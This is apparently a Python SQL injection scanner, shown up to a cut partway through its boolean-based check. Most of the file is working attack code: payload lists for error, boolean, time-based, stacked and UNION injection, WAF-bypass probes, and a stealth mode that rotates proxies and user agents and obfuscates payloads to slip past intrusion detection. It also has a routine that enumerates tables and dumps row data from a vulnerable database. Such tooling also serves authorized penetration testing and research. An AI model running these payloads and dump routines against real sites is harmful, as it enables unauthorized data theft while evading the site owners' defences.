#!/usr/bin/env python3
"""
sqlscan.py - Automated SQL Injection Vulnerability Scanner
For authorized penetration testing, CTF challenges, and security research only.
"""

import argparse
import sys
import os
import time
import re
import json
import random
import string
import itertools
from collections import deque
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Tuple, Set

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    from bs4 import BeautifulSoup
    HAS_DEPS = True
except ImportError:
    HAS_DEPS = False

# ─── Colours ────────────────────────────────────────────────────────────────

RESET = "\033[0m"
RED   = "\033[91m"
GRN   = "\033[92m"
YLW   = "\033[93m"
BLU   = "\033[94m"
MAG   = "\033[95m"
CYN   = "\033[96m"
BOLD  = "\033[1m"

def banner():
    print(f"""{CYN}{BOLD}
  ___  ___  _     ___  ___   _   _  _
 / __|/ _ \\| |   / __|/ __| /_\\ | \\| |
 \\__ \\ (_) | |__ \\__ \\ (__ / _ \\| .` |
 |___/\\__\\_\\____||___/\\___/_/ \\_\\_|\\_|
{RESET}{YLW}  Automated SQL Injection Scanner v1.1{RESET}
{RED}  [!] For authorized testing and research only{RESET}
""")

def log_info(msg):  print(f"{BLU}[*]{RESET} {msg}")
def log_ok(msg):    print(f"{GRN}[+]{RESET} {msg}")
def log_warn(msg):  print(f"{YLW}[!]{RESET} {msg}")
def log_err(msg):   print(f"{RED}[-]{RESET} {msg}")
def log_vuln(msg):  print(f"{MAG}{BOLD}[VULN]{RESET} {msg}")

# ─── SQL Error Fingerprints ──────────────────────────────────────────────────

DB_ERRORS = {
    "MySQL": [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
        r"check the manual that corresponds to your MySQL server",
        r"Unknown column .+ in 'field list'", r"com\.mysql\.jdbc\.exceptions",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR", r"Warning.*\bpg_", r"Npgsql\.",
        r"PG::SyntaxError:", r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
    ],
    "MSSQL": [
        r"Driver.*SQL[\-_ ]*Server", r"OLE DB.*SQL Server",
        r"Warning.*mssql_", r"Unclosed quotation mark after the character string",
        r"Microsoft OLE DB Provider for SQL Server",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver", r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException", r"\[SQLITE_ERROR\]",
    ],
    "Oracle": [
        r"\bORA-\d{4,5}", r"Oracle error", r"Oracle.*Driver",
        r"Warning.*\boci_", r"quoted string not properly terminated",
    ],
    "Generic": [
        r"SQL syntax", r"syntax error", r"mysql_fetch",
        r"You have an error in your SQL", r"ODBC.*Driver",
        r"JET Database Engine", r"Access Database Engine",
    ],
}

# ─── Payloads ────────────────────────────────────────────────────────────────

# Error-based single-char probes
ERROR_PROBES = ["'", '"', "`", "\\", ";", "''", "'--", "'#", "' OR '1'='1"]

# Boolean pairs (true_payload, false_payload)
BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' OR '1'='1", "' OR '1'='2"),
    (" AND 1=1",     " AND 1=2"),
    (" OR 1=1",      " OR 1=2"),
    ("') AND ('1'='1", "') AND ('1'='2"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
]

# Time-based payloads (DBMS-specific)
TIME_PAYLOADS = [
    ("'; WAITFOR DELAY '0:0:{s}'--",        "MSSQL"),
    ("'; SELECT SLEEP({s})--",              "MySQL"),
    ("'; SELECT pg_sleep({s})--",           "PostgreSQL"),
    ("1 AND SLEEP({s})",                    "MySQL"),
    ("1; WAITFOR DELAY '0:0:{s}'--",        "MSSQL"),
    ("' OR SLEEP({s})--",                   "MySQL"),
    ("' OR pg_sleep({s})--",                "PostgreSQL"),
]

# UNION column-count detection
UNION_ORDER_BY = ["' ORDER BY {n}--", "' ORDER BY {n}#", " ORDER BY {n}--"]

# WAF-bypass probes: obfuscated variants that slip past naive keyword filters
WAF_BYPASS_PROBES = [
    "'/**/OR/**/'1'='1",
    "' oR '1'='1--",
    "'\tOR\t'1'='1--",
    "' OR 0x31=0x31--",
    "' OR 1 LIKE 1--",
    "' OR 1 BETWEEN 1 AND 1--",
    "/*!50000'*//*!50000OR*//*!50000'1'='1*/--",
    "' OR ISNULL(NULL,1)=1--",
    "%27%20OR%20%271%27%3D%271--",
    "' OR 'unusual'='unusual'--",
]

# Stacked query payloads: ';' terminates the first statement, sleep confirms execution
STACKED_PAYLOADS = [
    ("'; SELECT SLEEP({s})--",           "MySQL"),
    ("'; WAITFOR DELAY '0:0:{s}'--",     "MSSQL"),
    ("'; SELECT pg_sleep({s})--",        "PostgreSQL"),
    ("1; SELECT SLEEP({s})--",           "MySQL"),
    ("1; WAITFOR DELAY '0:0:{s}'--",     "MSSQL"),
    ("1; SELECT pg_sleep({s})--",        "PostgreSQL"),
]

# HTTP headers that apps commonly interpolate into SQL (logging, analytics, IP-allow-listing)
INJECTABLE_HEADERS = [
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Client-IP",
    "Client-IP",
    "X-Real-IP",
    "Referer",
    "X-Originating-IP",
    "X-Remote-Addr",
    "X-Custom-IP-Authorization",
    "Contact",
]

# UNION extraction expressions per DBMS; {m} is replaced with a unique marker string
UNION_EXTRACT_EXPRS = {
    "MySQL": {
        "version":  "CONCAT('{m}',@@version,'{m}')",
        "user":     "CONCAT('{m}',user(),'{m}')",
        "database": "CONCAT('{m}',database(),'{m}')",
    },
    "PostgreSQL": {
        "version":  "'{m}'||version()||'{m}'",
        "user":     "'{m}'||current_user||'{m}'",
        "database": "'{m}'||current_database()||'{m}'",
    },
    "MSSQL": {
        "version":  "'{m}'+CAST(@@version AS varchar)+'{m}'",
        "user":     "'{m}'+CAST(system_user AS varchar)+'{m}'",
        "database": "'{m}'+CAST(db_name() AS varchar)+'{m}'",
    },
    "Generic": {
        "version":  "CONCAT('{m}',@@version,'{m}')",
        "user":     "CONCAT('{m}',user(),'{m}')",
        "database": "CONCAT('{m}',database(),'{m}')",
    },
}

# Separators used to pack multiple tables/columns/rows into a single UNION
# response (same marker-extraction trick as UNION_EXTRACT_EXPRS, just reused
# with aggregate functions so one request returns many values at once).
DUMP_ROWSEP = "~SQLXROWSEP~"
DUMP_COLSEP = "~SQLXCOLSEP~"
_IDENT_RE = re.compile(r"^[A-Za-z0-9_]+$")

# ─── Data Structures ─────────────────────────────────────────────────────────

@dataclass
class Finding:
    url: str
    param: str
    method: str
    technique: str
    dbms: Optional[str]
    payload: str
    evidence: str

@dataclass
class ScanResult:
    target: str
    findings: list = field(default_factory=list)
    tested_params: list = field(default_factory=list)
    dumps: list = field(default_factory=list)
    urls_crawled: int = 0
    start_time: float = field(default_factory=time.time)

# ─── HTTP Client ─────────────────────────────────────────────────────────────

_CONN_RETRIES = 3  # overridden at startup via --retry-conn
_STEALTH = False   # overridden at startup via --stealth

DEFAULT_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/124.0.0.0 Safari/537.36"
    ),
    "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
}

# Real browser User-Agents rotated in --stealth mode to avoid UA-based fingerprinting
STEALTH_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]

# SQL keyword case-randomization + inline-comment obfuscation: the same
# WAF/signature-evasion techniques sqlmap's randomcase/space2comment tamper
# scripts use. Only whole-word keyword tokens are mutated so quoted string
# literals and UNION markers are never touched.
_SQL_KEYWORDS_RE = re.compile(
    r"\b(SELECT|UNION|FROM|WHERE|AND|OR|ORDER|BY|NULL|WAITFOR|DELAY|SLEEP|"
    r"CONCAT|CAST|AS|TOP|LIMIT|GROUP|PG_SLEEP|INSERT|UPDATE|DELETE)\b",
    re.IGNORECASE,
)

def _randomize_keyword_case(s):
    return _SQL_KEYWORDS_RE.sub(
        lambda m: "".join(random.choice((c.upper(), c.lower())) for c in m.group(0)), s
    )

def _inline_comment_spaces(s):
    return "".join("/**/" if c == " " and random.random() < 0.5 else c for c in s)

def mutate_payload(payload):
    """Apply automatic WAF/IDS evasion to a payload when --stealth is enabled."""
    if not _STEALTH:
        return payload
    return _inline_comment_spaces(_randomize_keyword_case(payload))

def sleep_jitter(delay):
    """Sleep for `delay`, or a randomized jitter around it in --stealth mode
    (avoids the fixed-interval timing signature of robotic scanning)."""
    if _STEALTH and delay > 0:
        delay = random.uniform(delay * 0.5, delay * 1.5)
    time.sleep(delay)

def make_session(proxy=None, proxy_list=None, timeout=10, headers=None):
    s = requests.Session()
    retry = Retry(total=3, backoff_factor=0.3,
                  status_forcelist=[500, 502, 503, 504],
                  connect=3)
    s.mount("http://",  HTTPAdapter(max_retries=retry))
    s.mount("https://", HTTPAdapter(max_retries=retry))
    s.headers.update(DEFAULT_HEADERS)
    if headers:
        s.headers.update(headers)
    if proxy_list:
        s._proxy_cycle = itertools.cycle(proxy_list)
    elif proxy:
        s.proxies = {"http": proxy, "https": proxy}
    s.verify = False
    return s

def load_proxy_list(raw):
    """Accepts a path to a file (one proxy per line) or a comma-separated list."""
    if not raw:
        return []
    if os.path.isfile(raw):
        with open(raw) as fh:
            lines = fh.readlines()
    else:
        lines = raw.split(",")
    return [l.strip() for l in lines if l.strip() and not l.strip().startswith("#")]

def send(session, method, url, params=None, data=None, timeout=10, max_conn_retries=None):
    """Send an HTTP request with automatic retry on connection errors."""
    if max_conn_retries is None:
        max_conn_retries = _CONN_RETRIES
    if getattr(session, "_proxy_cycle", None):
        p = next(session._proxy_cycle)
        session.proxies = {"http": p, "https": p}
    if _STEALTH:
        session.headers["User-Agent"] = random.choice(STEALTH_USER_AGENTS)
    if method.upper() == "GET" and params is not None:
        # `params` already carries the full parameter set (built from the URL's
        # own query string by the caller) — if the URL still has its original
        # query string, requests APPENDS instead of replacing, sending the
        # payload as a duplicate key (?id=1&id=1') that most servers ignore.
        parsed = urlparse(url)
        url = urlunparse(parsed._replace(query=""))
    for attempt in range(max_conn_retries):
        try:
            if method.upper() == "GET":
                r = session.get(url, params=params, timeout=timeout)
            else:
                r = session.post(url, data=data, timeout=timeout)
            return r
        except requests.exceptions.ConnectionError:
            if attempt < max_conn_retries - 1:
                wait = 2 ** attempt
                log_warn(f"Connection refused (tentative {attempt+1}/{max_conn_retries})"
                         f" — nouvel essai dans {wait}s...")
                time.sleep(wait)
            else:
                log_err(f"Connection refusée après {max_conn_retries} tentatives : {url}")
        except requests.exceptions.Timeout:
            log_warn(f"Timeout: {url}")
            return None
        except Exception as e:
            log_err(f"Erreur requête: {e}")
            return None
    return None

# ─── Parameter Discovery ─────────────────────────────────────────────────────

def extract_url_params(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    return {k: v[0] for k, v in params.items()}

def inject_url_param(url, param, value):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [value]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))

def crawl_forms(session, url, timeout=10):
    """Discover HTML forms and their input fields."""
    r = send(session, "GET", url, timeout=timeout)
    if not r:
        return []
    forms = []
    try:
        soup = BeautifulSoup(r.text, "html.parser")
        for form in soup.find_all("form"):
            action = form.get("action", "")
            method = form.get("method", "get").upper()
            action_url = urljoin(url, action) if action else url
            inputs = {}
            for tag in form.find_all(["input", "textarea", "select"]):
                name = tag.get("name")
                if name:
                    inputs[name] = tag.get("value", "test")
            if inputs:
                forms.append({"url": action_url, "method": method, "data": inputs})
    except Exception as e:
        log_warn(f"Form crawl error: {e}")
    return forms

# ─── Site Spider ─────────────────────────────────────────────────────────────

# File extensions to skip when spidering
SKIP_EXTS = {
    ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".webp",
    ".css", ".js", ".woff", ".woff2", ".ttf", ".eot",
    ".pdf", ".zip", ".tar", ".gz", ".rar", ".mp4", ".mp3",
    ".exe", ".dmg", ".apk", ".xml", ".json",
}

def _normalise_url(url: str) -> str:
    """Strip fragment; sort query params for dedup key."""
    p = urlparse(url)
    params = parse_qs(p.query, keep_blank_values=True)
    # Key only on param names (not values) so ?id=1 and ?id=2 are the same target
    key_query = urlencode(sorted((k, "") for k in params), doseq=True)
    return urlunparse(p._replace(query=key_query, fragment=""))

def _same_domain(base: str, link: str) -> bool:
    return urlparse(base).netloc == urlparse(link).netloc

def _skip_url(url: str) -> bool:
    path = urlparse(url).path.lower()
    return any(path.endswith(ext) for ext in SKIP_EXTS)

@dataclass
class SpiderTarget:
    url: str
    method: str
    params: Dict[str, str]   # GET params
    data: Dict[str, str]     # POST data

def spider(session, start_url: str, max_depth: int, max_urls: int,
           timeout: int, delay: float) -> List[SpiderTarget]:
    """
    BFS crawl from start_url, staying on the same domain.
    Returns a deduplicated list of SpiderTargets that have at least one parameter.
    """
    base_origin = "{0.scheme}://{0.netloc}".format(urlparse(start_url))
    visited_keys: Set[str] = set()   # normalised URL keys (param names only)
    visited_pages: Set[str] = set()  # raw URLs we've fetched (to avoid re-fetch)
    targets: List[SpiderTarget] = []
    queue: deque = deque([(start_url, 0)])

    log_info(f"Spider starting from {start_url}  (depth={max_depth} max-urls={max_urls})")

    while queue and len(visited_pages) < max_urls:
        url, depth = queue.popleft()

        # Normalise for fetch dedup
        clean = urlunparse(urlparse(url)._replace(fragment=""))
        if clean in visited_pages:
            continue
        if _skip_url(clean):
            continue
        visited_pages.add(clean)

        r = send(session, "GET", clean, timeout=timeout)
        sleep_jitter(delay)
        if not r:
            continue

        # ── Collect this URL if it has GET params ─────────────────────────
        url_params = extract_url_params(clean)
        if url_params:
            key = _normalise_url(clean)
            if key not in visited_keys:
                visited_keys.add(key)
                targets.append(SpiderTarget(
                    url=clean, method="GET",
                    params=url_params, data={},
                ))
                log_ok(f"  Found GET params {list(url_params)} → {clean}")

        # ── Parse page for more links and forms ───────────────────────────
        if depth >= max_depth:
            continue
        if "text/html" not in r.headers.get("Content-Type", ""):
            continue

        try:
            soup = BeautifulSoup(r.text, "html.parser")
        except Exception:
            continue

        # Follow <a href>
        for tag in soup.find_all("a", href=True):
            href = tag["href"].strip()
            if not href or href.startswith(("#", "mailto:", "tel:", "javascript:")):
                continue
            abs_href = urljoin(clean, href)
            if not _same_domain(start_url, abs_href):
                continue
            abs_clean = urlunparse(urlparse(abs_href)._replace(fragment=""))
            if abs_clean not in visited_pages:
                queue.append((abs_clean, depth + 1))

        # Collect forms
        for form in soup.find_all("form"):
            action  = form.get("action", "")
            method  = form.get("method", "get").upper()
            form_url = urljoin(clean, action) if action else clean
            if not _same_domain(start_url, form_url):
                continue
            inputs: Dict[str, str] = {}
            for tag in form.find_all(["input", "textarea", "select"]):
                name = tag.get("name")
                if name:
                    inputs[name] = tag.get("value", "1")
            if not inputs:
                continue
            key = _normalise_url(form_url) + "|" + method + "|" + ",".join(sorted(inputs))
            if key not in visited_keys:
                visited_keys.add(key)
                targets.append(SpiderTarget(
                    url=form_url, method=method,
                    params={} if method == "POST" else inputs,
                    data=inputs if method == "POST" else {},
                ))
                log_ok(f"  Found {method} form params {list(inputs)} → {form_url}")

    log_info(f"Spider done — {len(visited_pages)} pages fetched, "
             f"{len(targets)} injectable targets found")
    return targets

# ─── Manual Parameter Entry ──────────────────────────────────────────────────

def prompt_manual_params():
    """Interactive prompt to enter GET/POST parameters manually."""
    print(f"\n{YLW}[?]{RESET} Aucun paramètre détecté. Saisie manuelle :")
    print(f"  Entrez {CYN}clé=valeur{RESET} puis Entrée (ligne vide pour terminer)\n")

    url_params: Dict[str, str] = {}
    print(f"{BLU}[Paramètres GET]{RESET}")
    while True:
        try:
            line = input("  GET> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not line:
            break
        if "=" in line:
            k, _, v = line.partition("=")
            url_params[k.strip()] = v.strip()
            log_ok(f"  Ajouté GET : {k.strip()}={v.strip()}")
        else:
            log_warn(f"Format invalide '{line}' — attendu clé=valeur")

    post_data: Dict[str, str] = {}
    print(f"\n{BLU}[Paramètres POST]{RESET}")
    while True:
        try:
            line = input("  POST> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not line:
            break
        if "=" in line:
            k, _, v = line.partition("=")
            post_data[k.strip()] = v.strip()
            log_ok(f"  Ajouté POST : {k.strip()}={v.strip()}")
        else:
            log_warn(f"Format invalide '{line}' — attendu clé=valeur")

    return url_params, post_data


def prompt_new_url():
    """Ask the user to re-enter the target URL after a connection failure."""
    print(f"\n{YLW}[?]{RESET} Voulez-vous réessayer avec une autre URL ? (laisser vide pour quitter)")
    try:
        new_url = input("  URL> ").strip()
    except (EOFError, KeyboardInterrupt):
        return None
    return new_url if new_url else None


# ─── Baseline Fetch ──────────────────────────────────────────────────────────

def get_baseline(session, method, url, params, data, timeout):
    """Fetch a clean baseline response for comparison."""
    r = send(session, method, url, params=params, data=data, timeout=timeout)
    if r:
        return r.text, r.status_code, len(r.text)
    return None, None, None

# ─── Detection Techniques ────────────────────────────────────────────────────

def detect_dbms_from_error(text):
    for dbms, patterns in DB_ERRORS.items():
        for pattern in patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return dbms
    return None

def check_waf_bypass(session, method, url, param, base_params, base_data,
                     baseline_text, timeout, delay):
    """Run obfuscated probes when standard error probes return nothing (WAF evasion)."""
    for payload in WAF_BYPASS_PROBES:
        if method == "GET":
            tp = dict(base_params); tp[param] = base_params.get(param, "") + mutate_payload(payload)
            r = send(session, "GET", url, params=tp, timeout=timeout)
        else:
            td = dict(base_data); td[param] = base_data.get(param, "") + mutate_payload(payload)
            r = send(session, "POST", url, data=td, timeout=timeout)
        if not r:
            continue
        dbms = detect_dbms_from_error(r.text)
        if dbms and not detect_dbms_from_error(baseline_text or ""):
            return payload, dbms, f"WAF-bypass probe triggered [{dbms}] error"
        sleep_jitter(delay)
    return None, None, None


def check_stacked_queries(session, method, url, param, base_params, base_data,
                          timeout, delay, sleep_sec=3):
    """Detect stacked-query execution by timing a second sleep statement after ';'."""
    for template, hint_dbms in STACKED_PAYLOADS:
        payload = template.format(s=sleep_sec)
        t0 = time.time()
        if method == "GET":
            tp = dict(base_params); tp[param] = base_params.get(param, "") + mutate_payload(payload)
            r = send(session, "GET", url, params=tp,
                     timeout=max(timeout, sleep_sec + 5))
        else:
            td = dict(base_data); td[param] = base_data.get(param, "") + mutate_payload(payload)
            r = send(session, "POST", url, data=td,
                     timeout=max(timeout, sleep_sec + 5))
        elapsed = time.time() - t0
        if elapsed >= sleep_sec * 0.9:
            return payload, hint_dbms, (
                f"Stacked query delayed {elapsed:.1f}s — "
                f"multi-statement execution confirmed ({hint_dbms})"
            )
        sleep_jitter(delay)
    return None, None, None


def check_header_injection(session, url, timeout, delay):
    """Probe HTTP headers that apps commonly store in SQL queries (logs, analytics, ACLs)."""
    baseline = send(session, "GET", url, timeout=timeout)
    baseline_text = baseline.text if baseline else ""
    findings = []
    for header in INJECTABLE_HEADERS:
        for payload in ERROR_PROBES[:5]:
            if getattr(session, "_proxy_cycle", None):
                p = next(session._proxy_cycle)
                session.proxies = {"http": p, "https": p}
            if _STEALTH:
                session.headers["User-Agent"] = random.choice(STEALTH_USER_AGENTS)
            try:
                r = session.get(
                    url, headers={header: f"sqlscantest{mutate_payload(payload)}"}, timeout=timeout
                )
            except Exception:
                continue
            if not r:
                continue
            dbms = detect_dbms_from_error(r.text)
            if dbms and not detect_dbms_from_error(baseline_text):
                findings.append({
                    "header": header, "payload": payload, "dbms": dbms,
                    "evidence": f"SQL error [{dbms}] via header {header}={payload!r}",
                })
                break
            sleep_jitter(delay)
    return findings


def union_extract_data(session, method, url, param, base_params, base_data,
                       col_count, dbms, timeout, delay):
    """Find the string-injectable column then extract DB version/user/database via UNION SELECT."""
    marker = "SQLX" + "".join(random.choices(string.ascii_uppercase, k=5))

    # Step 1: find which column reflects a string literal
    string_col = None
    for i in range(col_count):
        nulls = ["NULL"] * col_count
        nulls[i] = f"'{marker}'"
        for term in ("--", "#"):
            payload = f"' UNION SELECT {','.join(nulls)}{term}"
            if method == "GET":
                tp = dict(base_params); tp[param] = base_params.get(param, "") + mutate_payload(payload)
                r = send(session, "GET", url, params=tp, timeout=timeout)
            else:
                td = dict(base_data); td[param] = base_data.get(param, "") + mutate_payload(payload)
                r = send(session, "POST", url, data=td, timeout=timeout)
            if r and marker in r.text:
                string_col = i
                break
        if string_col is not None:
            break
        sleep_jitter(delay)

    if string_col is None:
        return {}, None

    log_ok(f"  UNION string-injectable column: #{string_col + 1}")

    # Step 2: extract DB fingerprint using marker-framed expressions
    dbms_key = dbms if dbms in UNION_EXTRACT_EXPRS else "Generic"
    extracted = {}
    for label, expr_tpl in UNION_EXTRACT_EXPRS[dbms_key].items():
        expr = expr_tpl.replace("{m}", marker)
        nulls = ["NULL"] * col_count
        nulls[string_col] = expr
        for term in ("--", "#"):
            payload = f"' UNION SELECT {','.join(nulls)}{term}"
            if method == "GET":
                tp = dict(base_params); tp[param] = base_params.get(param, "") + mutate_payload(payload)
                r = send(session, "GET", url, params=tp, timeout=timeout)
            else:
                td = dict(base_data); td[param] = base_data.get(param, "") + mutate_payload(payload)
                r = send(session, "POST", url, data=td, timeout=timeout)
            if r:
                m = re.search(
                    re.escape(marker) + r"(.+?)" + re.escape(marker), r.text, re.DOTALL
                )
                if m:
                    value = m.group(1).strip()
                    extracted[label] = value
                    log_ok(f"  Extracted {label}: {GRN}{value}{RESET}")
                    break
            sleep_jitter(delay)

    return extracted, string_col


# ─── Auto DB Dump (built on the same proven UNION marker-extraction) ────────

def _safe_ident(name):
    return bool(_IDENT_RE.match(name))

def _dump_wrap_marker(dbms, inner_expr, marker):
    if dbms == "MSSQL":
        return f"'{marker}'+CAST({inner_expr} AS varchar(max))+'{marker}'"
    if dbms in ("PostgreSQL", "SQLite"):
        return f"'{marker}'||{inner_expr}||'{marker}'"
    return f"CONCAT('{marker}',{inner_expr},'{marker}')"  # MySQL / Generic

def _dump_tables_query(dbms):
    if dbms == "PostgreSQL":
        return ("(SELECT string_agg(table_name, '" + DUMP_ROWSEP + "') "
                 "FROM information_schema.tables "
                 "WHERE table_schema NOT IN ('pg_catalog','information_schema'))")
    if dbms == "MSSQL":
        return ("(SELECT STRING_AGG(table_name, '" + DUMP_ROWSEP + "') "
                 "FROM information_schema.tables WHERE table_type='BASE TABLE')")
    if dbms == "SQLite":
        return ("(SELECT GROUP_CONCAT(name, '" + DUMP_ROWSEP + "') "
                 "FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%')")
    return ("(SELECT GROUP_CONCAT(table_name SEPARATOR '" + DUMP_ROWSEP + "') "
            "FROM information_schema.tables WHERE table_schema=DATABASE())")  # MySQL / Generic

def _dump_columns_query(dbms, table):
    if dbms == "PostgreSQL":
        return ("(SELECT string_agg(column_name, '" + DUMP_ROWSEP + "') "
                f"FROM information_schema.columns WHERE table_name='{table}')")
    if dbms == "MSSQL":
        return ("(SELECT STRING_AGG(column_name, '" + DUMP_ROWSEP + "') "
                f"FROM information_schema.columns WHERE table_name='{table}')")
    if dbms == "SQLite":
        return ("(SELECT GROUP_CONCAT(name, '" + DUMP_ROWSEP + "') "
                f"FROM pragma_table_info('{table}'))")
    return ("(SELECT GROUP_CONCAT(column_name SEPARATOR '" + DUMP_ROWSEP + "') "
            f"FROM information_schema.columns WHERE table_name='{table}' "
            "AND table_schema=DATABASE())")  # MySQL / Generic

def _dump_rows_query(dbms, table, columns, limit):
    if dbms == "PostgreSQL":
        cols_expr = (" || '" + DUMP_COLSEP + "' || ").join(
            f'COALESCE(CAST("{c}" AS text),\'\')' for c in columns
        )
        return (f'(SELECT string_agg({cols_expr}, \'{DUMP_ROWSEP}\') '
                f'FROM (SELECT * FROM "{table}" LIMIT {limit}) sqlx_sub)')
    if dbms == "MSSQL":
        cols_expr = (" + '" + DUMP_COLSEP + "' + ").join(
            f"COALESCE(CAST([{c}] AS varchar(max)),'')" for c in columns
        )
        return (f"(SELECT STRING_AGG({cols_expr}, '{DUMP_ROWSEP}') "
                f"FROM (SELECT TOP {limit} * FROM [{table}]) sqlx_sub)")
    if dbms == "SQLite":
        cols_expr = (" || '" + DUMP_COLSEP + "' || ").join(
            f"COALESCE({c},'')" for c in columns
        )
        return (f'(SELECT GROUP_CONCAT({cols_expr}, \'{DUMP_ROWSEP}\') '
                f'FROM (SELECT * FROM "{table}" LIMIT {limit}) sqlx_sub)')
    cols_expr = "CONCAT(" + (",'" + DUMP_COLSEP + "',").join(
        f"COALESCE(`{c}`,'')" for c in columns
    ) + ")"
    return (f"(SELECT GROUP_CONCAT({cols_expr} SEPARATOR '{DUMP_ROWSEP}') "
            f"FROM (SELECT * FROM `{table}` LIMIT {limit}) sqlx_sub)")  # MySQL / Generic


def union_dump_database(session, method, url, param, base_params, base_data,
                        col_count, string_col, dbms, timeout, delay,
                        max_tables=5, max_columns=20, max_rows=10):
    """Auto-dump table/column names and row data, reusing the already-proven
    UNION string-column + marker extraction from union_extract_data."""
    dbms_key = dbms if dbms in ("MySQL", "PostgreSQL", "MSSQL", "SQLite") else "Generic"

    def run_query(inner_expr):
        marker = "SQLX" + "".join(random.choices(string.ascii_uppercase, k=5))
        wrapped = _dump_wrap_marker(dbms_key, inner_expr, marker)
        nulls = ["NULL"] * col_count
        nulls[string_col] = wrapped
        for term in ("--", "#"):
            payload = f"' UNION SELECT {','.join(nulls)}{term}"
            if method == "GET":
                tp = dict(base_params); tp[param] = base_params.get(param, "") + mutate_payload(payload)
                r = send(session, "GET", url, params=tp, timeout=timeout)
            else:
                td = dict(base_data); td[param] = base_data.get(param, "") + mutate_payload(payload)
                r = send(session, "POST", url, data=td, timeout=timeout)
            if r:
                m = re.search(re.escape(marker) + r"(.+?)" + re.escape(marker), r.text, re.DOTALL)
                if m:
                    return m.group(1)
            sleep_jitter(delay)
        return None

    dump = {}

    log_info("  Auto-dumping database contents (UNION)...")
    raw_tables = run_query(_dump_tables_query(dbms_key))
    if not raw_tables:
        log_warn("  Could not enumerate tables")
        return dump
    tables = [t for t in raw_tables.split(DUMP_ROWSEP) if t and _safe_ident(t)][:max_tables]
    if not tables:
        log_warn("  No usable table names returned")
        return dump
    log_ok(f"  Found {len(tables)} table(s): {', '.join(tables)}")

    for table in tables:
        raw_cols = run_query(_dump_columns_query(dbms_key, table))
        if not raw_cols:
            continue
        columns = [c for c in raw_cols.split(DUMP_ROWSEP) if c and _safe_ident(c)][:max_columns]
        if not columns:
            continue
        log_ok(f"  [{table}] columns: {', '.join(columns)}")

        raw_rows = run_query(_dump_rows_query(dbms_key, table, columns, max_rows))
        rows = []
        if raw_rows:
            rows = [r.split(DUMP_COLSEP) for r in raw_rows.split(DUMP_ROWSEP)]
            log_ok(f"  [{table}] dumped {len(rows)} row(s)")
        dump[table] = {"columns": columns, "rows": rows}

    return dump


def check_error_based(session, method, url, param, base_params, base_data, 
                      baseline_text, timeout, delay):
    """Inject error-causing chars and look for SQL error messages in response."""
    for payload in ERROR_PROBES:
        if method == "GET":
            test_params = dict(base_params)
            test_params[param] = base_params.get(param, "") + mutate_payload(payload)
            r = send(session, "GET", url, params=test_params, timeout=timeout)
        else:
            test_data = dict(base_data)
            test_data[param] = base_data.get(param, "") + mutate_payload(payload)
            r = send(session, "POST", url, data=test_data, timeout=timeout)

        if not r:
            continue

        dbms = detect_dbms_from_error(r.text)
        if dbms and dbms not in ("Generic",):
            return payload, dbms, f"DBMS error pattern [{dbms}] in response"

        if dbms == "Generic":
            # Confirm: baseline shouldn't have had it
            if not detect_dbms_from_error(baseline_text or ""):
                return payload, None, "Generic SQL error pattern in response"

        sleep_jitter(delay)
    return None, None, None

def check_boolean_based(session, method, url, param, base_params, base_data,
                        baseline_text, timeout, delay):
    """Compare true/false boolean payloads; large diff signals injection."""
    for true_p, false_p in BOOLEAN_PAIRS:
        # True condition
        if method == "GET":
            tp = dict(base_params); tp[param] = base_params.get(param, "") + mutate_payload(true_p)
            fp = dict(base_params); fp[param] = base_params.get(param, "") + mutate_payload(false_p)
            r_true  = send(session, "GET", url, params=tp, timeout=timeout)
            sleep_jitter(delay)
            r_false = send(session, "GET", url, params=fp, timeout=timeout)
        else:
            td = dict(base_data); td[param] = base_data.get(param, "") + mutate_payload(true_p)
            fd = dict(base_data); fd[param] = base_data.get(param, "") + mutate_payload(false_p)
            r_true  = send(session, "POST", url, data=td, timeout=timeout)
            sleep_jitter(delay)
            r_false = send(session, "POST", url, data=fd, timeout=timeout)

        if not r_true or not r_false:
            continue

        # HTTP status code divergence is a strong boolean signal
        if r_true.status_code != r_false.status_code and r_true.status_code == 200:
            return (true_p, false_p), "Boolean-based blind", (
                f"Status code TRUE={r_true.status_code} FALSE={r_false.status_code}"
            )

